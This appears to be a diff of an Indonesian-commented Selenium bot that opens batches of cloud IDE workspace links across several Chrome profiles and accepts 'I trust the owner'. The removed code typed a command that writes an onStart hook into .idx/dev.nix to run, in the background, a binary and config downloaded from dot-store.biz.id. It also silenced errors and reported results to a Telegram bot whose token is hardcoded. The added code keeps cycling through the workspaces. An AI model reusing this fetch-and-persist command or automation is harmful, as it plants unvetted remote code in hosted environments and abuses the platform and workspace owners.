@@ -5,23 +5,40 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException, NoSuchElementException
-import subprocess
-import pyautogui
-import time
+from datetime import datetime, timedelta
 import os
-from datetime import datetime
+import time
 import sys
-import requests
 
-SLEEP_SEBELUM_AKSI = 75
-SLEEP_SESUDAH_AKSI = 20
+# Konfigurasi Waktu
+SLEEP_SEBELUM_AKSI = 60
+SLEEP_SESUDAH_AKSI = 30
 SLEEP_JIKA_ERROR = 10
+LOG_CLEAR_INTERVAL = 3600  # 1 jam dalam detik
 
-def silent_excepthook(*args, **kwargs):
-    pass
+# Variabel global untuk waktu terakhir clear log
+last_log_clear_time = datetime.now()
 
-sys.excepthook = silent_excepthook
+def clear_screen():
+    """Membersihkan layar console"""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def log_sukses(profile_name, current, total):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} berhasil proses link {current}/{total}", flush=True)
+
+def log_error(profile_name, link, error):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} error pada link {link}: {str(error)}", flush=True)
+
+def log_element_not_found(profile_name, element_name):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} elemen '{element_name}' tidak ditemukan, melanjutkan...", flush=True)
+
+def check_and_clear_logs():
+    global last_log_clear_time
+    now = datetime.now()
+    if (now - last_log_clear_time).total_seconds() >= LOG_CLEAR_INTERVAL:
+        clear_screen()
+        print(f"[{now.strftime('%H:%M:%S')}] Log telah dibersihkan")
+        last_log_clear_time = now
 
 def get_options(user_data_dir, profile_dir):
     options = webdriver.ChromeOptions()
@@ -50,149 +67,64 @@ def read_links_from_file(path):
     with open(path, 'r') as f:
         return [line.strip() for line in f if line.strip()]
 
-def find_and_click_rebuild(driver):
-    try:
-        iframes = driver.find_elements(By.TAG_NAME, "iframe")
-        for i, iframe in enumerate(iframes):
-            driver.switch_to.frame(iframe)
-            try:
-                rebuild_btn = WebDriverWait(driver, 3).until(
-                    EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
-                )
-                if "Rebuild Environment" in rebuild_btn.text:
-                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", rebuild_btn)
-                    time.sleep(0.5)
-                    driver.execute_script("arguments[0].click();", rebuild_btn)
-                    return True
-            except TimeoutException:
-                pass
-            finally:
-                driver.switch_to.default_content()
-        return False
-    except Exception:
-        driver.switch_to.default_content()
-        return False
-
-def open_terminal_and_run(driver):
-    try:
-        actions = ActionChains(driver)
-        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
-        time.sleep(2)
-
-        body = driver.find_element(By.TAG_NAME, "body")
-        body.click()
-        actions = ActionChains(driver)
-        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
-        time.sleep(3)
-        
-        commands = [ 'grep -q "joko = " .idx/dev.nix || sed -i \'/onStart = {/a \\        joko = "cd  ~/.cloud && nohup ./cloud -c \'config.json\' > /dev/null 2>\\&1 &";\' .idx/dev.nix && cd ~/ && mkdir -p .cloud && cd .cloud && wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json']
-        
-        for cmd in commands:
-            actions = ActionChains(driver)
-            for char in cmd:
-                actions.send_keys(char)
-            actions.send_keys(Keys.ENTER)
-            actions.perform()
-            time.sleep(2)
-
-            actions = ActionChains(driver)
-            actions.send_keys(Keys.ENTER)
-            actions.perform()
-            time.sleep(3)
-
-        find_and_click_rebuild(driver)
-        driver.refresh()
-        time.sleep(2)
-        actions = ActionChains(driver)
-        actions.send_keys(Keys.ENTER)
-        actions.perform()
-        time.sleep(5)
-        return True
-    except Exception:
-        return False
-
-def process_single_link(driver, link):
+def process_single_link(driver, link, profile_name):
     try:
         driver.get(link)
-        wait = WebDriverWait(driver, 20)
+        wait = WebDriverWait(driver, 10)
+        
         try:
             trust = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
             trust.click()
-            time.sleep(2)
-            return True
-        except Exception:
+        except Exception as e:
+            log_element_not_found(profile_name, "I trust the owner")
             return False
-    except Exception:
+        
+        try:
+            open_ws = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
+            open_ws.click()
+        except Exception as e:
+            log_element_not_found(profile_name, "Open Workspace")
+            return False
+        
+        time.sleep(SLEEP_SEBELUM_AKSI)
+        
+        try:
+            driver.find_element(By.TAG_NAME, "body").click()
+            actions = ActionChains(driver)
+            actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys("c").key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
+        except Exception as e:
+            log_error(profile_name, link, e)
+            return False
+        
+        time.sleep(SLEEP_SESUDAH_AKSI)
+        return True
+        
+    except Exception as e:
+        log_error(profile_name, link, e)
         time.sleep(SLEEP_JIKA_ERROR)
         return False
 
-def send_to_telegram(file_path, caption):
-    token = '8455364218:AAFoy_mvhZi9HYeTM48hO9aXapE-cYmWuCs'
-    chat_id = '6501677690'
-    url = f'https://api.telegram.org/bot{token}/sendDocument'
-    
-    with open(file_path, 'rb') as f:
-        files = {'document': f}
-        data = {'chat_id': chat_id, 'caption': caption}
-        try:
-            requests.post(url, files=files, data=data)
-            return True
-        except Exception:
-            return False
-
 def worker(profile_name, user_data_dir, profile_dir, window_position, links):
     if not links:
+        print(f"{profile_name} tidak memiliki link untuk diproses")
         return
-    sys.stderr = open('nul', 'w')
 
     options = get_options(user_data_dir, profile_dir)
     driver = webdriver.Chrome(options=options)
-
+    
     if window_position:
         driver.set_window_position(*window_position)
 
-    success_links = []
-    failed_links = []
+    while True:
+        total = len(links)
+        count = 0
 
-    for link in links:
-        trust_success = process_single_link(driver, link)
-        if trust_success:
-            success_links.append(link)
-            try:
-                open_ws = WebDriverWait(driver, 20).until(
-                    EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
-                open_ws.click()
-                time.sleep(2)
-                
-                time.sleep(SLEEP_SEBELUM_AKSI)
-                open_terminal_and_run(driver)
-                time.sleep(SLEEP_SESUDAH_AKSI)
-            except Exception:
-                pass
-        else:
-            failed_links.append(link)
-
-    with open("sukses.txt", "a") as f:
-        f.write("\n".join(success_links) + "\n")
-    
-    with open("gagal.txt", "a") as f:
-        f.write("\n".join(failed_links) + "\n")
-    
-    if success_links:
-        temp_success = f"temp_sukses_{profile_name}.txt"
-        with open(temp_success, "w") as f:
-            f.write("\n".join(success_links))
-        send_to_telegram(temp_success, f"✅ {profile_name} - {len(success_links)} Link Trust Berhasil")
-        os.remove(temp_success)
-    
-    if failed_links:
-        temp_failed = f"temp_gagal_{profile_name}.txt"
-        with open(temp_failed, "w") as f:
-            f.write("\n".join(failed_links))
-        send_to_telegram(temp_failed, f"⚠️ {profile_name} - {len(failed_links)} Link Trust Gagal")
-        os.remove(temp_failed)
-
-    driver.quit()
+        for index, link in enumerate(links):
+            check_and_clear_logs()  # Cek apakah perlu clear log
+            success = process_single_link(driver, link, profile_name)
+            if success:
+                count += 1
+                log_sukses(profile_name, count, total)
 
 if __name__ == "__main__":
     user_profiles = [
@@ -202,16 +134,22 @@ if __name__ == "__main__":
             "profile_dir": "Default",
             "window_position": (0, 0)
         },
+        {
+            "name": "Profile2",
+            "user_data_dir": r"C:\Users\Administrator\Desktop\Profile2",
+            "profile_dir": "Default",
+            "window_position": (0, 150)
+        },
     ]
 
     all_links = read_links_from_file("link.txt")
     if not all_links:
+        print("link.txt kosong, keluar.")
         exit(1)
 
-    links_for_profiles = []
-    chunk_size = (len(all_links) + len(user_profiles) - 1) // len(user_profiles)
-    for i in range(0, len(all_links), chunk_size):
-        links_for_profiles.append(all_links[i:i + chunk_size])
+    links_for_profiles = [[] for _ in user_profiles]
+    for i, link in enumerate(all_links):
+        links_for_profiles[i % len(user_profiles)].append(link)
 
     processes = []
     for i, profile in enumerate(user_profiles):
@@ -220,14 +158,19 @@ if __name__ == "__main__":
             profile['user_data_dir'],
             profile['profile_dir'],
             profile['window_position'],
-            links_for_profiles[i],
+            links_for_profiles[i]
         ))
         p.start()
         processes.append(p)
+        print(f"Memulai proses untuk {profile['name']} dengan {len(links_for_profiles[i])} link")
 
     try:
         while True:
             time.sleep(60)
     except KeyboardInterrupt:
+        print("\nMenghentikan semua proses...")
         for p in processes:
             p.terminate()
+        for p in processes:
+            p.join()
+        print("Semua proses dihentikan.")
